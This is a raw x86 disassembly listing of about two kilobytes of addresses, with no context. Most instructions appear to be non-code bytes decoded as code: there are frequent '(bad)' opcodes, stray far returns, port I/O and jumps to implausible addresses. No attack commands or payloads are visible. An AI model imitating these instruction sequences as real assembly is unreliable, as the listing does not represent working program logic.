  4302ad:	call   DWORD PTR [eax+0x7d01fc]
  4302b3:	mov    esi,DWORD PTR [esi]
  4302b5:	cld    
  4302b6:	add    BYTE PTR [eax+0x560150],dl
  4302bc:	test   DWORD PTR [ebp+0x75],eax
  4302bf:	loop   0x43024c
  4302c1:	jmp    0xe38b:0x947dc7fc
  4302c8:	fsub   st,st(7)
  4302ca:	add    bh,al
  4302cc:	mov    ebx,DWORD PTR [eax-0x7a6f8104]
  4302d2:	add    edi,edi
  4302d4:	add    bh,bh
  4302d6:	adc    al,0xed
  4302d8:	add    dh,ah
  4302da:	push   eax
  4302db:	inc    ebp
  4302dc:	push   esi
  4302dd:	fisttp WORD PTR [ebx+0x4dc7f43f]
  4302e3:	test   BYTE PTR [ebx],dh
  4302e5:	out    0x5,al
  4302e7:	shl    BYTE PTR [edx+0x45],0x0
  4302eb:	jmp    0x4302ae
  4302ed:	fild   DWORD PTR [edi+eax*8-0x22ff73ff]
  4302f4:	inc    esi
  4302f5:	jle    0x4302f7
  4302f7:	test   edi,eax
  4302f9:	(bad)  
  4302fa:	call   0x13003fe
  4302ff:	out    0x75,al
  430301:	test   DWORD PTR [ebx+0x45fffcff],ecx
  430307:	in     al,dx
  430308:	mov    esp,edx
  43030a:	mov    ah,0x85
  43030c:	add    bh,bh
  43030e:	call   0x1292d12
  430313:	ror    BYTE PTR [ebx-0x7f00037b],0xff
  43031a:	add    ebx,esp
  43031c:	add    ah,ch
  43031e:	xor    BYTE PTR [ebp-0xff0073],al
  430324:	mov    ebx,ebp
  430326:	cld    
  430327:	jle    0x4302b2
  430329:	add    DWORD PTR gs:[eax],eax
  43032c:	add    BYTE PTR [eax+0x1],dl
  43032f:	inc    ebp
  430330:	inc    ebp
  430331:	mov    ecx,DWORD PTR [ebx+0xd8a8]
  430337:	dec    DWORD PTR [ebx-0x3fd80318]
  43033d:	add    BYTE PTR [ebp-0xbf0040],dl
  430343:	inc    ebp
  430344:	fmul   QWORD PTR [ebx-0x4faf0400]
  43034a:	inc    ebp
  43034b:	add    DWORD PTR [ebx+0x459c00],ecx
  430351:	mov    edi,edi
  430353:	mov    eax,0xe80800ff
  430358:	inc    ebp
  430359:	sub    cl,BYTE PTR [ebx-0x47000400]
  43035f:	add    al,0x1
  430361:	rol    BYTE PTR [eax],0x1e
  430364:	jne    0x4303ab
  430366:	xor    ecx,DWORD PTR [ebx-0x4f830373]
  43036c:	inc    DWORD PTR [ecx]
  43036e:	call   0x882c73
  430373:	mov    ecx,DWORD PTR [ebx-0x7fff0348]
  430379:	call   0x432d7f
  43037e:	xor    bh,bh
  430380:	push   edi
  430381:	adc    BYTE PTR [ebx-0x74741bbb],al
  430387:	fsub   st,st(4)
  430389:	ret    
  43038a:	loopne 0x430327
  43038c:	xor    DWORD PTR [edx],0x31
  43038f:	cmp    edi,edi
  430391:	bswap  eax
  430393:	rol    BYTE PTR gs:[eax],0x5
  430397:	jmp    0x12e04e1
  43039c:	mov    eax,DWORD PTR [ebp-0x4]
  43039f:	add    BYTE PTR [eax+0xff0100],bh
  4303a5:	cld    
  4303a6:	jne    0x430425
  4303a8:	xor    ecx,DWORD PTR [ebx-0x6f6f0373]
  4303ae:	jb     0x4303b1
  4303b0:	add    BYTE PTR [eax],al
  4303b2:	push   eax
  4303b3:	fild   DWORD PTR [ebp+0x0]
  4303b6:	mov    edx,DWORD PTR [eax-0x68]
  4303b9:	inc    ebp
  4303ba:	add    BYTE PTR [ebx+0xffa8ff],cl
  4303c0:	or     bh,bh
  4303c2:	inc    ebp
  4303c3:	call   0x1272ac7
  4303c8:	jge    0x430417
  4303ca:	adc    BYTE PTR [ebx+0x459cb9],cl
  4303d0:	mov    ecx,DWORD PTR [ecx-0x33c7404]
  4303d6:	fwait
  4303d7:	mov    eax,0x30132
  4303dc:	lea    esi,[ebp+0x2c]
  4303df:	xor    edi,edi
  4303e1:	(bad)  
  4303e2:	call   0x1422d4f
  4303e7:	call   0x1372d77
  4303ec:	jne    0x430379
  4303ee:	xor    edi,esp
  4303f0:	add    eax,DWORD PTR [eax+0xc018d]
  4303f6:	push   DWORD PTR [eax]
  4303f8:	call   0xcc2d54
  4303fd:	enter  0x45ff,0xe0
  430401:	mov    ecx,DWORD PTR [ebp-0x28]
  430404:	xor    eax,DWORD PTR [eax]
  430406:	add    ecx,DWORD PTR [ebx-0x3f8a03c5]
  43040c:	(bad)  
  43040d:	xchg   ebp,eax
  43040e:	call   0x1420512
  430413:	mov    cl,0x45
  430415:	add    BYTE PTR [ebx-0x3cbaf7b0],cl
  43041b:	mov    eax,DWORD PTR [esp+ebx*4-0xcdff65]
  430422:	mov    edi,edi
  430424:	or     BYTE PTR [eax],cl
  430426:	inc    ebp
  430427:	test   DWORD PTR gs:[eax],eax
  43042a:	je     0x430471
  43042c:	mov    eax,DWORD PTR [ebx-0x3fb2f844]
  430432:	xor    edx,DWORD PTR [eax-0x73]
  430435:	push   ebp
  430436:	or     BYTE PTR [ebp+0x21007572],al
  43043c:	inc    ebp
  43043d:	loopne 0x4303ca
  43043f:	sub    BYTE PTR [ebp+eax*2-0x279a743d],bh
  430446:	int    0x0
  430448:	sub    ecx,DWORD PTR [ebx-0x3f2703fd]
  43044e:	inc    ebp
  43044f:	push   ebp
  430450:	cmp    ebp,eax
  430452:	movaps XMMWORD PTR [eax-0x74740100],xmm4
  430459:	cld    
  43045a:	fadd   QWORD PTR [eax+0x3b014d]
  430460:	jne    0x430492
  430462:	push   0xf8898557
  430467:	loopne 0x4304de
  430469:	inc    ebp
  43046a:	lea    eax,[ebx+0x72e8e4cc]
  430470:	xor    DWORD PTR [ebx+0x7545bc00],ecx
  430476:	jmp    0x4304ab
  430478:	mov    edi,DWORD PTR [edi+0x4572bc]
  43047e:	xor    eax,edi
  430480:	adc    DWORD PTR [ebp-0xcd0065],0x8b3d31
  43048a:	rcl    BYTE PTR [eax-0x40],1
  43048d:	inc    ebp
  43048e:	lock mov eax,DWORD PTR [esp+edi*8-0x38ff3cf9]
  430496:	inc    ebp
  430497:	xchg   ebp,eax
  430498:	ud0    ebp,DWORD PTR [ebx]
  43049b:	inc    DWORD PTR [eax]
  43049d:	daa    
  43049e:	jbe    0x4304a0
  4304a0:	mov    dl,BYTE PTR [eax-0x80]
  4304a3:	push   ebp
  4304a4:	pop    ds
  4304a5:	mov    ecx,DWORD PTR [esp+esi*8]
  4304a8:	inc    eax
  4304a9:	retf   
  4304aa:	inc    ebp
  4304ab:	iret   
  4304ac:	jb     0x430476
  4304ae:	mov    eax,DWORD PTR [edi]
  4304b0:	int3   
  4304b1:	inc    ebp
  4304b2:	inc    ebp
  4304b3:	add    DWORD PTR [ecx],esi
  4304b5:	add    BYTE PTR [ebx+ecx*4+0x4df0bc89],bl
  4304bc:	xor    dh,BYTE PTR [ebx]
  4304be:	pushf  
  4304bf:	lea    ecx,[ecx+0x4d72d808]
  4304c5:	add    BYTE PTR [ebx],dh
  4304c7:	inc    ebp
  4304c8:	mov    DWORD PTR [ebx-0x3f64174c],ecx
  4304ce:	xor    dl,BYTE PTR [edx]
  4304d0:	add    eax,DWORD PTR [ebp-0x77]
  4304d3:	mov    eax,esp
  4304d5:	fmul   QWORD PTR [ebp-0x3d]
  4304d8:	xor    eax,DWORD PTR [ebx+eax*1+0x832899b]
  4304df:	mov    DWORD PTR [ebp-0x24],eax
  4304e2:	rol    DWORD PTR [ebp-0x64],1
  4304e5:	xor    eax,edi
  4304e7:	mov    ecx,0xff858db0
  4304ec:	clc    
  4304ed:	enter  0x4d45,0x3c
  4304f1:	mov    ebx,DWORD PTR [eax+ecx*1-0x795b3e39]
  4304f8:	test   esi,edi
  4304fa:	clc    
  4304fb:	inc    DWORD PTR [ebp+0x45]
  4304fe:	mov    ebx,DWORD PTR ds:[eax+ecx*1+0x16a8c8c7]
  430506:	test   DWORD PTR [ecx],esi
  430508:	clc    
  430509:	pushf  
  43050a:	inc    ebp
  43050b:	(bad)  
  43050c:	cmp    ah,bh
  43050e:	pushf  
  43050f:	inc    ebp
  430510:	mov    edx,DWORD PTR [eax-0x24]
  430513:	add    BYTE PTR [ebp+0x0],dl
  430516:	xor    ecx,DWORD PTR [ecx+0x103bd003]
  43051c:	cmovge edx,DWORD PTR [ebx+ecx*4]
  430520:	add    al,dl
  430522:	jmp    0x10406f2
  430527:	jb     0x430576
  430529:	add    BYTE PTR [ebx-0x2e8a0ff8],cl
  43052f:	xor    ecx,DWORD PTR [ebp+0x3b]
  430532:	xor    ecx,DWORD PTR [edi]
  430534:	add    ecx,DWORD PTR [ebx+edi*1+0x0]
  430538:	(bad)  
  43053a:	clc    
  43053b:	int3   
  43053c:	add    BYTE PTR [ebx+ecx*4+0x5500b007],al
  430543:	push   cs
  430544:	xor    ecx,eax
  430546:	xor    esp,ecx
  430548:	add    ebp,DWORD PTR [eax]
  43054a:	add    esi,DWORD PTR [eax]
  43054c:	(bad)  
  43054e:	retf   0x55cc
  430551:	repnz mov eax,DWORD PTR [ebp-0x10]
  430555:	(bad)  
  430556:	cli    
  430557:	fdiv   st(1),st
  430559:	test   DWORD PTR [eax+edi*8],ecx
  43055c:	dec    ebp
  43055d:	inc    ebp
  43055e:	xor    edi,DWORD PTR [eax-0x7167afd]
  430564:	add    BYTE PTR [ebp+0x0],al
  430567:	mov    ecx,DWORD PTR [ebp-0x24]
  43056a:	mov    ecx,ebx
  43056c:	clc    
  43056d:	jne    0x43053a
  43056f:	mov    esi,0xd672d3
  430574:	into   
  430575:	into   
  430576:	scas   eax,DWORD PTR es:[edi]
  430577:	dec    ebp
  430578:	mov    ecx,DWORD PTR [ebx-0x3482233c]
  43057e:	sub    ecx,esi
  430580:	cmp    ecx,DWORD PTR [ebp+0x77]
  430583:	(bad)  
  430584:	mov    edi,eax
  430586:	mov    al,0x85
  430588:	mov    eax,edi
  43058a:	add    BYTE PTR [ebp-0x75],al
  43058d:	xor    esp,DWORD PTR [esp+ebx*4-0x47cc38ab]
  430594:	xor    eax,DWORD PTR [ebp+0x4503f803]
  43059a:	(bad)  
  43059c:	retf   0x559c
  43059f:	(bad)  
  4305a0:	mov    ebp,DWORD PTR [eax+esi*8-0x607057b]
  4305a7:	inc    ebp
  4305a8:	add    eax,0xeb9c4d3f
  4305ad:	(bad)  
  4305ae:	mov    ecx,eax
  4305b0:	lods   al,BYTE PTR ds:[esi]
  4305b1:	test   DWORD PTR [ebp-0x8],edx
  4305b4:	xor    ecx,DWORD PTR [ebp+0x33]
  4305b7:	mov    eax,DWORD PTR [ebx]
  4305b9:	lock add ecx,ebx
  4305bc:	bswap  esi
  4305be:	retf   0x55d1
  4305c1:	test   BYTE PTR [ebx-0x5ff0ffe],cl
  4305c7:	jmp    0x4305c2
  4305c9:	add    BYTE PTR ds:0xebc44d8b,al
  4305cf:	push   ebp
  4305d0:	mov    ebp,DWORD PTR [ebx]
  4305d2:	test   al,0x8b
  4305d4:	push   ebp
  4305d5:	clc    
  4305d6:	xor    ecx,ebx
  4305d8:	xor    ecx,esi
  4305da:	add    edx,ecx
  4305dc:	add    eax,DWORD PTR [edx+0xca010f]
  4305e2:	push   ebp
  4305e3:	dec    ebp
  4305e4:	mov    ecx,DWORD PTR [ebx-0x34050710]
  4305ea:	stc    
  4305eb:	rol    DWORD PTR ds:0xebce4dd6,cl
  4305f1:	scas   eax,DWORD PTR es:[edi]
  4305f2:	mov    ecx,DWORD PTR [ebx+0x7d55c4c8]
  4305f8:	xor    ebp,DWORD PTR [ebx]
  4305fa:	xor    edi,DWORD PTR [ebx]
  4305fc:	add    esi,DWORD PTR [edi+0x3]
  4305ff:	mov    ecx,DWORD PTR [edi]
  430601:	clc    
  430602:	retf   0x55cb
  430605:	into   
  430606:	mov    edi,DWORD PTR [eax+esi*8-0x6740600]
  43060d:	mov    eax,0x3376554d
  430612:	mov    esi,DWORD PTR [ebx]
  430614:	enter  0x5503,0x3
  430618:	xor    ecx,DWORD PTR [edi]
  43061a:	xor    ecx,edx
  43061c:	add    edx,DWORD PTR [ebp+0x3]
  43061f:	mov    ecx,DWORD PTR [edi]
  430621:	lock retf 0x4dfa
  430625:	stc    
  430626:	mov    ecx,DWORD PTR [eax]
  430628:	or     BYTE PTR [ebp+0x4d],cl
  43062b:	jmp    0x10706bb
  430630:	dec    ebp
  430631:	dec    ebp
  430632:	(bad)  
  430633:	mov    esp,esp
  430635:	clc    
  430636:	test   ebx,ecx
  430638:	clc    
  430639:	ror    DWORD PTR [ebp-0x2a],cl
  43063c:	mov    esi,ecx
  43063e:	in     al,dx
  43063f:	scas   eax,DWORD PTR es:[edi]
  430640:	inc    ebp
  430641:	mov    esi,DWORD PTR [ebx]
  430643:	les    ebx,FWORD PTR [ebp+edi*2+0x3be42b8b]
  43064a:	retf   
  43064b:	ja     0x43061b
  43064d:	mov    ebp,DWORD PTR [eax-0x48]
  430650:	dec    ebp
  430651:	xor    ecx,DWORD PTR [di+0x3]
  430655:	mov    ebp,eax
  430657:	clc    
  430658:	push   ebp
  430659:	retf   
  43065a:	mov    dl,bl
  43065c:	adc    esi,edx
  43065e:	jb     0x43062e
  430660:	add    BYTE PTR [edi-0x3b7474b3],ch
  430666:	in     al,dx
  430667:	jge    0x430634
  430669:	sub    ecx,DWORD PTR [ebp+0x3b]
  43066c:	mov    esi,DWORD PTR [edi-0x24]
  43066f:	mov    ecx,DWORD PTR [esp+eiz*4+0x4d32459b]
  430676:	mov    BYTE PTR [ebx-0x34b20729],cl
  43067c:	mov    edx,ebx
  43067e:	in     al,dx
  43067f:	(bad)  
  430680:	ror    esi,cl
  430682:	push   ebp
  430683:	scas   eax,DWORD PTR es:[edi]
  430684:	mov    ecx,DWORD PTR [ebx+0x7d8cc4dc]
  43068a:	fwait
  43068b:	sub    esi,DWORD PTR [edx]
  43068d:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  430693:	lods   al,BYTE PTR ds:[esi]
  430694:	xor    esp,DWORD PTR [ebx]
  430696:	add    ecx,DWORD PTR [ebp-0x18]
  430699:	mov    edi,DWORD PTR [ebp-0x8]
  43069c:	mov    bl,cl
  43069e:	cmp    dl,bl
  4306a0:	jb     0x430670
  4306a2:	add    dh,dl
  4306a4:	dec    ebp
  4306a5:	scas   eax,DWORD PTR es:[edi]
  4306a6:	mov    ecx,DWORD PTR [ebx+0x7dcbc4ec]
  4306ac:	shr    DWORD PTR [ebx],cl
  4306ae:	into   
  4306af:	cmp    edx,esi
  4306b1:	mov    ebp,DWORD PTR [edi-0x17fcfc58]
  4306b7:	dec    ebp
  4306b8:	dec    ebp
  4306b9:	mov    ecx,DWORD PTR [ebx+0x55d3ecf8]
  4306bf:	retf   
  4306c0:	xor    edx,esi
  4306c2:	add    ecx,esi
  4306c4:	imul   ecx,edx
  4306c7:	mov    DWORD PTR [ebp+0x8],edx
  4306ca:	xor    ecx,DWORD PTR [ebp+0x2b]
  4306cd:	mov    DWORD PTR [ebx+0x7d4dece0],ecx
  4306d3:	add    esi,DWORD PTR [ebx]
  4306d5:	mov    ah,0x3
  4306d7:	inc    ebp
  4306d8:	rdtsc  
  4306da:	xlat   BYTE PTR ds:[ebx]
  4306db:	pushf  
  4306dc:	jge    0x430667
  4306de:	xor    ebx,esp
  4306e0:	sub    eax,DWORD PTR [ebp-0x73]
  4306e3:	(bad)  
  4306e4:	cmp    al,al
  4306e6:	jb     0x43066d
  4306e8:	add    al,bh
  4306ea:	ror    DWORD PTR [ebp-0x7a],1
  4306ed:	xor    edi,edi
  4306ef:	add    edi,edi
  4306f1:	jmp    0x430740
  4306f3:	mov    ecx,DWORD PTR [ebx-0x34341f1c]
  4306f9:	dec    ebp
  4306fa:	into   
  4306fb:	mov    ebp,DWORD PTR [edi-0x1b737424]
  430701:	fwait
  430702:	shl    DWORD PTR [edx],cl
  430704:	retf   0x5588
  430707:	or     ecx,DWORD PTR [ebp+0x7233114d]
  43070d:	add    eax,DWORD PTR [eax]
  43070f:	call   0x8ace5c61
  430714:	fcom   DWORD PTR [ecx]
  430716:	retf   
  430717:	jb     0x43077e
  430719:	add    ch,cl
  43071b:	dec    ebp
  43071c:	sub    ecx,DWORD PTR [edx+0x55f00b03]
  430722:	dec    ebp
  430723:	xor    ecx,DWORD PTR [ebx-0x34173bfd]
  430729:	jge    0x4306f9
  43072b:	mov    BYTE PTR [edi+0xf723b3a],ch
  430731:	add    cl,dh
  430733:	dec    ebp
  430734:	dec    DWORD PTR [ebx-0x2c031b75]
  43073a:	adc    BYTE PTR [ebp+0x1],0x8b
  43073e:	add    ah,bl
  430740:	jge    0x4306ce
  430742:	push   0xffffff9b
  430744:	push   0x8b3032
  430749:	shl    BYTE PTR [ebp+0x55],0x6a
  43074d:	xor    edi,edi
  43074f:	xor    edx,DWORD PTR [ebx+eax*1]
  430752:	inc    ebp
  430753:	add    eax,DWORD PTR [ebp-0x7c358bf1]
  430759:	dec    ebp
  43075a:	or     BYTE PTR [ecx+0x4dcce883],cl
  430760:	jbe    0x4306ed
  430762:	mov    esp,eax
  430764:	ror    bl,1
  430766:	enter  0x14ce,0xaf
  43076a:	dec    DWORD PTR [ebx-0x2cef13f8]
  430770:	push   ebp
  430771:	retf   0x5540
  430774:	push   ebp
  430775:	mov    esi,DWORD PTR [edx-0x18]
  430778:	mov    edx,ebx
  43077a:	cld    
  43077b:	(bad)  
  43077c:	sub    BYTE PTR [edi-0x1bff74ff],0x0
  430783:	sti    
  430784:	add    dh,cl
  430786:	push   0xffffff94
  430788:	call   FWORD PTR [ebx+0x3b5032d0]
  43078e:	mov    ecx,DWORD PTR [edi]
  430790:	enter  0x455e,0xff
  430794:	mov    DWORD PTR [ebx+0x5545eccc],ecx
  43079a:	xor    esi,DWORD PTR [ebx]
  43079c:	mov    DWORD PTR [ebx],0xcace0f9c
  4307a2:	aas    
  4307a3:	push   ebp
  4307a4:	inc    ebp
  4307a5:	xor    edx,esi
  4307a7:	add    edx,esi
  4307a9:	mov    eax,DWORD PTR [ebx]
  4307ab:	(bad)  
  4307ac:	jmp    0x43073a
  4307ae:	mov    bl,BYTE PTR [ebx-0x7674cdfb]
  4307b4:	rol    ah,1
  4307b6:	mov    esi,0xf133104d
  4307bb:	mov    edx,0xff388d80
  4307c0:	mov    dh,0xd1
  4307c2:	cmp    edx,DWORD PTR [ebp+0xf]
  4307c5:	mov    eax,DWORD PTR [edx-0x28]
  4307c8:	add    BYTE PTR [ebp-0x75],bh
  4307cb:	xor    edi,DWORD PTR [ebx+eax*1-0x307bf035]
  4307d2:	fwait
  4307d3:	retf   0x8632
  4307d6:	cmp    ebp,0x8
  4307d9:	call   ebx
  4307db:	inc    ebp
  4307dc:	inc    ebp
  4307dd:	mov    ecx,DWORD PTR [ebx+0x450008d8]
  4307e3:	mov    esi,DWORD PTR [ecx]
  4307e5:	int3   
  4307e6:	pushf  
  4307e7:	add    al,0xc7
  4307e9:	add    al,al
  4307eb:	add    bl,al
  4307ed:	(bad)  
  4307ee:	clc    
  4307ef:	int3   
  4307f0:	inc    ebp
  4307f1:	add    BYTE PTR [ecx],dh
  4307f3:	push   eax
  4307f4:	pushf  
  4307f5:	mov    edi,eax
  4307f7:	enter  0xc008,0x85
  4307fb:	aas    
  4307fc:	clc    
  4307fd:	gs inc ebp
  4307ff:	add    BYTE PTR [ebx+0x4d00fc7d],cl
  430805:	push   ss
  430806:	xor    ecx,DWORD PTR [ebp+0x3]
  430809:	sub    edx,DWORD PTR [ecx-0x76]
  43080c:	dec    ebp
  43080d:	add    DWORD PTR [ebx+0x88d845],ecx
  430813:	mov    esi,DWORD PTR [ebx]
  430815:	or     BYTE PTR [ebx],al
  430817:	cmp    edx,DWORD PTR [ecx-0x34]
  43081a:	dec    ebp
  43081b:	out    dx,eax
  43081c:	xor    eax,DWORD PTR [ebp+0x3]
  43081f:	mov    edx,DWORD PTR [ecx-0x28]
  430822:	dec    ebp
  430823:	add    BYTE PTR [ebx],dh
  430825:	push   0x518003
  43082a:	push   eax
  43082b:	add    BYTE PTR [ebx-0x300748b],cl
  430831:	sbb    BYTE PTR [ebp+0x45],cl
  430834:	mov    ecx,DWORD PTR [ecx+0x7d00d0d8]
  43083a:	xor    ecx,DWORD PTR [ebx-0x3cae0bfd]
  430840:	dec    ebp
  430841:	inc    ebp
  430842:	xor    edx,esi
  430844:	add    edx,esi
  430846:	push   ecx
  430847:	(bad)  
  430848:	dec    ebp
  430849:	mov    al,ds:0xc5d83dff
  43084e:	retf   
  43084f:	(bad)  
  430850:	into   
  430851:	sub    bh,bh
  430853:	dec    esp
  430854:	adc    al,0x9c
  430856:	inc    ebp
  430857:	push   ebp
  430858:	test   DWORD PTR [edi],ecx
  43085a:	unpcklps xmm0,XMMWORD PTR [ecx-0x7ab9ff80]
  430861:	jmp    0xc9bc1775
  430866:	add    cl,dl
  430868:	mov    DWORD PTR [ebp+0x8501c0],0x33454df8
  430872:	xor    ecx,DWORD PTR [ebp+0x728b089c]
  430878:	rol    BYTE PTR [eax],0x54
  43087b:	clc    
  43087c:	gs jb  0x430886
  43087f:	mov    eax,DWORD PTR [ebp-0x30]
  430882:	xor    al,0x40
  430884:	sub    al,0xc7
  430886:	mov    al,ah
  430888:	add    DWORD PTR [ebp+0x4534f845],eax
  43088e:	sub    al,0x80
  430890:	mov    BYTE PTR [edx+eax*1-0x375a39],bl
  430897:	mov    ch,0xff
  430899:	clc    
  43089a:	add    DWORD PTR [ebp+0x60],0x3d
  43089e:	call   FWORD PTR [eax+eax*1-0x277a77]
  4308a5:	inc    ebp
  4308a6:	dec    DWORD PTR [ebx-0x3427f701]
  4308ac:	test   esi,ecx
  4308ae:	dec    DWORD PTR [ebx-0x7f8a3701]
  4308b4:	push   eax
  4308b5:	add    DWORD PTR [ebp+0x0],eax
  4308b8:	dec    ebx
  4308ba:	or     al,0xce
  4308bc:	ror    BYTE PTR [ebx-0x34173fb0],0x4
  4308c3:	into   
  4308c4:	add    BYTE PTR [ebx-0x34ff2000],cl
  4308ca:	mov    esi,ecx
  4308cc:	sar    bh,0x45
  4308cf:	adc    al,0x8b
  4308d1:	clc    
  4308d2:	fadd   DWORD PTR [ebp+0x0]
  4308d5:	mov    ebp,DWORD PTR [edx+0x8]
  4308d8:	push   edi
  4308d9:	adc    BYTE PTR [eax+0x1],0x83
  4308dd:	add    al,al
  4308df:	retf   
  4308e0:	mov    ecx,esi
  4308e2:	cld    
  4308e3:	mov    eax,DWORD PTR [eax+0xcb01c8]
  4308e9:	into   
  4308ea:	add    BYTE PTR [ebx+0x756ae000],cl
  4308f0:	jne    0x430925
  4308f2:	inc    DWORD PTR [ebx]
  4308f4:	rcl    BYTE PTR [ecx+0x50],1
  4308f7:	push   eax
  4308f8:	mov    ecx,DWORD PTR [ecx-0xbaf7f8]
  4308fe:	mov    eax,DWORD PTR [eax+ebx*8-0x14ffbafd]
  430905:	sar    bh,0x84
  430908:	or     BYTE PTR [ebx],al
  43090a:	push   eax
  43090b:	add    BYTE PTR [ebx+0x453ccc45],cl
  430911:	pushf  
  430912:	xor    edi,eax
  430914:	pushf  
  430915:	mov    ah,0x89
  430917:	test   esp,ebp
  430919:	clc    
  43091a:	inc    ebp
  43091b:	inc    ebp
  43091c:	mov    DWORD PTR [eax+eax*8],esi
  43091f:	sub    al,0x32
  430921:	mov    BYTE PTR [ebx+ecx*4+0x54dce089],bl
  430928:	dec    ebp
  430929:	xor    eax,DWORD PTR gs:[edi+0x3]
  43092d:	mov    ecx,DWORD PTR [ecx+0x4d54f4b4]
  430933:	xor    eax,DWORD PTR gs:[edi+0x3]
  430937:	or     DWORD PTR [ecx+0x45ff085c],0x0
  43093e:	shl    DWORD PTR [ebp-0x380064],1
  430944:	enter  0x858d,0x60
  430948:	clc    
  430949:	inc    DWORD PTR [ebp+0x50]
  43094c:	cmp    al,0x75
  43094e:	pushf  
  43094f:	(bad)  
  430950:	(bad)  
  430951:	pop    esp
  430952:	lods   al,BYTE PTR ds:[esi]
  430953:	inc    DWORD PTR [ebp+0x4508f8ff]
  430959:	mov    edi,DWORD PTR [esi]
  43095b:	rcr    BYTE PTR [eax+esi*2+0x10b883c7],1
  430962:	test   DWORD PTR [edi-0x8],edx
  430965:	sbb    al,0x45
  430967:	add    BYTE PTR [eax],bh
  430969:	push   0x8b809c
  43096e:	loopne 0x4309b5
  430970:	push   ebp
  430971:	mov    esi,DWORD PTR [ebx]
  430973:	cld    
  430974:	add    eax,DWORD PTR [eax+0xf013b]
  43097a:	adc    al,0x0
  43097c:	add    bh,bh
  43097e:	jmp    0xc00a9b
  430983:	add    BYTE PTR [ebp+0x45],cl
  430986:	mov    ecx,DWORD PTR [ebx+0xd1d8ec]
  43098c:	dec    ebp
  43098d:	push   0x38033
  430992:	cmp    eax,DWORD PTR [eax]
  430994:	unpcklps xmm7,xmm0
  430997:	jne    0x430999
  430999:	dec    DWORD PTR [ebx+0x5545c818]
  43099f:	mov    DWORD PTR [ebx],esi
  4309a1:	shl    BYTE PTR [ebx],1
  4309a3:	inc    ebp
  4309a4:	add    ecx,DWORD PTR [ecx+0x60fcc03]
  4309aa:	retf   0x5575
  4309ad:	dec    DWORD PTR [ebx-0x5ba13e8]
  4309b3:	(bad)  
  4309b4:	stc    
  4309b5:	loopne 0x4309c3
  4309b7:	test   DWORD PTR [ebp-0x8],ecx
  4309ba:	xor    eax,DWORD PTR [ebp+0x3]
  4309bd:	mov    ebp,ecx
  4309bf:	rol    BYTE PTR [eax],1
  4309c1:	inc    ebp
  4309c2:	add    BYTE PTR [eax-0x7747ab3],bh
  4309c8:	clc    
  4309c9:	inc    ebp
  4309ca:	retf   
  4309cb:	mov    edx,ebx
  4309cd:	loopne 0x4309a5
  4309cf:	retf   
  4309d0:	into   
  4309d1:	into   
  4309d2:	scas   eax,DWORD PTR es:[edi]
  4309d3:	dec    ebp
  4309d4:	mov    ecx,DWORD PTR [ebx-0x34821f0c]
  4309da:	sub    ecx,esi
  4309dc:	cmp    ecx,DWORD PTR [ebp+0x77]
  4309df:	(bad)  
  4309e0:	mov    edi,eax
  4309e2:	enter  0x8985,0xf8
  4309e6:	add    BYTE PTR [ebp-0x75],al
  4309e9:	xor    ebp,DWORD PTR [esp+ebx*4-0x57cc38ab]
  4309f0:	xor    eax,DWORD PTR [ebp+0x4503f803]
  4309f6:	(bad)  
  4309f8:	retf   0x559c
  4309fb:	(bad)  
  4309fc:	mov    esp,DWORD PTR [esp+ebp*8-0x607057b]
  430a03:	inc    ebp
  430a04:	add    eax,0xeb9c4d3f
  430a09:	(bad)  
  430a0a:	mov    esi,DWORD PTR [eax-0x7aa7a5c]
  430a10:	xor    ecx,DWORD PTR [ebp+0x33]
  430a13:	mov    eax,DWORD PTR [ebx]
  430a15:	in     al,dx
  430a16:	add    ecx,ebx
  430a18:	bswap  esi
  430a1a:	retf   0x55d1
  430a1d:	test   BYTE PTR [ebx-0x5ff13fe],cl
  430a23:	jmp    0x430a1e
  430a25:	add    BYTE PTR ds:0xebf44d8b,al
  430a2b:	push   ebp
  430a2c:	mov    ebp,DWORD PTR [ebx]
  430a2e:	mov    eax,0x33f8558b
  430a33:	retf   
  430a34:	xor    ecx,esi
  430a36:	add    edx,ecx
  430a38:	add    eax,DWORD PTR [edx+0xca010f]
  430a3e:	push   ebp
  430a3f:	dec    ebp
  430a40:	mov    ecx,DWORD PTR [ebx-0x34050714]
  430a46:	stc    
  430a47:	rol    DWORD PTR ds:0xebce4dd6,cl
  430a4d:	scas   eax,DWORD PTR es:[edi]
  430a4e:	mov    ecx,DWORD PTR [ebx+0x7d55f4b0]
  430a54:	xor    ebp,DWORD PTR [ebx]
  430a56:	xor    edi,DWORD PTR [ebx]
  430a58:	add    esi,DWORD PTR [edi+0x3]
  430a5b:	mov    ecx,DWORD PTR [edi]
  430a5d:	clc    
  430a5e:	retf   0x55cb
  430a61:	into   
  430a62:	mov    edi,DWORD PTR [esp+ebp*8-0x6740600]
  430a69:	test   al,0x4d
  430a6b:	push   ebp
  430a6c:	jbe    0x430aa1
  430a6e:	mov    esi,DWORD PTR [ebx]
  430a70:	mov    al,0x3
  430a72:	push   ebp
  430a73:	add    esi,DWORD PTR [ebx]
  430a75:	rdpmc  
  430a77:	retf   0x5503
  430a7a:	add    ecx,DWORD PTR [ebx-0x53513f1]
  430a80:	dec    ebp
  430a81:	stc    
  430a82:	mov    ecx,DWORD PTR [eax]
  430a84:	or     BYTE PTR [ebp+0x4d],cl
  430a87:	jmp    0x1370b17
  430a8c:	dec    ebp
  430a8d:	dec    ebp
  430a8e:	(bad)  
  430a8f:	mov    esp,esp
  430a91:	clc    
  430a92:	test   ebx,ecx
  430a94:	clc    
  430a95:	ror    DWORD PTR [ebp-0x2a],cl
  430a98:	mov    esi,ecx
  430a9a:	lock scas eax,DWORD PTR es:[edi]
  430a9c:	inc    ebp
  430a9d:	mov    esi,DWORD PTR [ebx]
  430a9f:	hlt    
  430aa0:	pushf  
  430aa1:	jge    0x430a2e
  430aa3:	sub    esp,esp
  430aa5:	cmp    ecx,ebx
  430aa7:	ja     0x430a77
  430aa9:	mov    ebp,DWORD PTR [eax-0x58]
  430aac:	dec    ebp
  430aad:	xor    ecx,DWORD PTR [di+0x3]
  430ab1:	mov    ebp,eax
  430ab3:	clc    
  430ab4:	push   ebp
  430ab5:	retf   
  430ab6:	mov    dl,bl
  430ab8:	adc    esi,edx
  430aba:	jb     0x430a8a
  430abc:	add    BYTE PTR [edi-0xb7474b3],ch
  430ac2:	lock jge 0x430a90
  430ac5:	sub    ecx,DWORD PTR [ebp+0x3b]
  430ac8:	mov    esi,DWORD PTR [edi-0x28]
  430acb:	mov    ecx,DWORD PTR [esp+ebp*4+0x4d32459b]
  430ad2:	mov    BYTE PTR [ebx-0x34b20729],cl
